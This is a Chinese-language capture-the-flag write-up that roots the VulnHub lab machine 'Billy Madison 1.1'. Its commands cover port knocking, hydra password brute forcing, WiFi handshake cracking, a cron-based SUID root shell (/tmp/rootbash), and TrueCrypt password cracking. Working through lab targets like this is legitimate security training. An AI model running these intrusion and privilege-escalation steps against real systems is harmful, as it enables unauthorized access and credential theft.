# BILLY MADISON: 1.1

2024-7-30 https://www.vulnhub.com/entry/billy-madison-11,161/

difficulty: Beginner/Moderate

## IP

192.168.5.32

## Scan

Open Port -> 22,23,69,80,137,138,139,445,2525

```
PORT     STATE  SERVICE
22/tcp   open   ssh
23/tcp   open   telnet
69/tcp   open   tftp
80/tcp   open   http
137/tcp  closed netbios-ns
138/tcp  closed netbios-dgm
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
2525/tcp open   ms-v-worlds
```

80 web 上无信息，使用默认字典没爆破出隐藏目录。

23 telnet 上是一个提示信息：I don't use ROTten passwords like rkfpuzrahngvat anymore! Madison Hotels is as good as MINE!!!!

将得到的密码 rot13 运算得到 exschmenuating ，看起来像是个密码

看看 445 smb 上有什么信息： smbclient -N //192.168.5.32/EricsSecretStuff , 下载 3 个文件查看内容，没发现有用提示。

enum4linux 并枚举出 3 个用户：billy、veronica、eric，尝试用上面得到的 2 个类似密码，对 ssh 进行爆破，没有成功。

现在只有一个 web，看看新发现的 rkfpuzrahngvat 和 exschmenuating 是不是 web 上的目录，发现 http://192.168.5.32/exschmenuating/ 可以访问，并得到提示 veronica 会作为文件名的一部分，并且文件的后缀是 .cap 。

I .captured the whole thing in this folder for later lulz. I put "veronica" somewhere in the file name because I bet you a million dollars she uses her name as part of her passwords - if that's true, she rocks! Anyway, malware installation successful. I'm now in complete control of Bill's machine!

http://192.168.5.32/exschmenuating/currently-banned-hosts.txt 中发现我们的 IP 已经被禁用了，需要重置虚拟机。

看看 rockyou 中的单词有没有包好 veronica 的，`cat /usr/share/wordlists/rockyou.txt | grep 'veronica' > file.txt`

重新进行扫描：

```
gobuster -t 32 dir -u http://192.168.5.32/exschmenuating/ -k -w file.txt -e -x cap
```

发现抓包文件 012987veronica.cap 查看其内容，发现了几封往来的邮件，youtube 中提示了端口敲震，才能打开 ftp 端口，最后发现了 FTP 的访问密码：

```
We keep FTP turned off unless someone connects with the "Spanish Armada" combo. https://www.youtube.com/watch?v=z5YU7JwVy7s
Please set me up an account with username of "eric" and password "ericdoesntdrinkhisownpee."
```

先把虚拟机重置，前面提示已经被防火墙 ban 了。端口敲震顺序是 1466 67 1469 1514 1981 1986， 使用 knock 打开隐藏的端口：

```
knock -v 192.168.5.32 1466 67 1469 1514 1981 1986
```

这时重新扫描，发现了 ftp 端口 21 已经打开。

使用 eric:ericdoesntdrinkhisownpee 登陆 ftp, 将文件全部下载分析。.notes 有信息提示：

```
Fortunately, my SSH backdoor into the system IS working.
All I need to do is send an email that includes
the text: "My kid will be a ________ _________"

Hint: https://www.youtube.com/watch?v=6u7RsW5SAgs

The new secret port will be open and then I can login from there with my wifi password, which I'm sure Billy or Veronica know.  I didn't see it in Billy's FTP folders, but didn't have time to check Veronica's.
```

查看视频后，发现填空中的内容：My kid will be a soccer player. note 中提示使用 wifi 密码就可以登陆系统，billy 和 Veronica 知道，billy 的 ftp 中没有，veronica 还没看，那我们就看看她的 ftp 中有没有密码文件。

上面 23 端口的提示中说：she uses her name as part of her passwords 尝试用 rockyout 中包含 veronica 的单词去爆破一下她的密码：

```
hydra -t 10 -l veronica -P file.txt ftp://192.168.5.32
```

爆破除了密码 login: veronica password: babygirl_veronica07@yahoo.com

ftp 登陆，发现 email-from-billy.eml 和 eg-01.cap 下载这 2 个文件。查看这个 cap 文件，是一个 wifi 的抓包文件，其中可能有 wifi 的密码，使用 aircrack-ng 进行下爆破：

```
aircrack-ng eg-01.cap -w /usr/share/wordlists/rockyou.txt

发现密码:  triscuit*
```

现在需要找到新的开放端口，需要发送邮件，前面发现的邮件使用的是 2525 端口，使用 telnet 进行连接:

```
telnet 192.168.5.32 2525
HELO kali
MAIL FROM: vvaugh@polyfector.edu
RCPT TO: eric@madisonhotels.com
DATA

My kid will be a soccer player

.
quit
```

重新扫描一下端口，看看新开放了哪些，发现端口 1974 是新打开的 ssh，这时就可以用上面发现的密码进行登陆 `eric:triscuit*`, 登陆成功。

进行权限提升，内核版本 4.4.0-36-generic 可能存在内核漏洞。发现一个不是系统自带的 SUID /usr/local/share/sgml/donpcgd Usage: /usr/local/share/sgml/donpcgd path1 path2 好像是能以 eric 身份复制文件，但是没有文件内容。

```
touch /tmp/cro  # 这里必须要以eric的身份创建文件吗，然后拷贝。如果是/etc/passwd所属用户是root，后面还是不能修改

/usr/local/share/sgml/donpcgd /tmp/cro /var/spool/cron/crontabs/root  # 这个不行root文件已经存在。


/usr/local/share/sgml/donpcgd /tmp/cro /etc/cron.hourly/cro1     # 这里只能用hour这个计划任务，等待一个小时，不能使用root用户自定义的计划任务
eric@BM:~$ ls -al /etc/cron.hourly/cro1
-rw-rw-r-- 1 eric eric 0 Jul 30 04:18 /etc/cron.hourly/cro1

chmod +x /etc/cron.hourly/cro1
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' > /etc/cron.hourly/cro1
```

等待 1 个小时后，在/tmp 目录中生成了 rootbash, 执行 /tmp/rootbash -p 获得了 root 权限。

在 /PRIVATE 发现了提示文件 hint.txt，提示密码在这个连接中：https://en.wikipedia.org/wiki/Billy_Madison 使用 cewl 收集下密码信息：

```
cewl -d 0 'https://en.wikipedia.org/wiki/Billy_Madison' -w pass
```

使用上面得到的密码字典对 BowelMovement 进行解密，使用 truecrack 进行解密 truecrypt：

```
truecrack -v -t BowelMovement -w pass
Found password:		"execrable"
```

最后安装 veracrypt 输入得到的密码 execrable 就能看到原始的文件了：

```
mkdir /tmp/true
veracrypt -tc BowelMovement /tmp/true
```

解密后，得到一个 secret.zip 文件，将其解压，就得到了最终的目标文件。
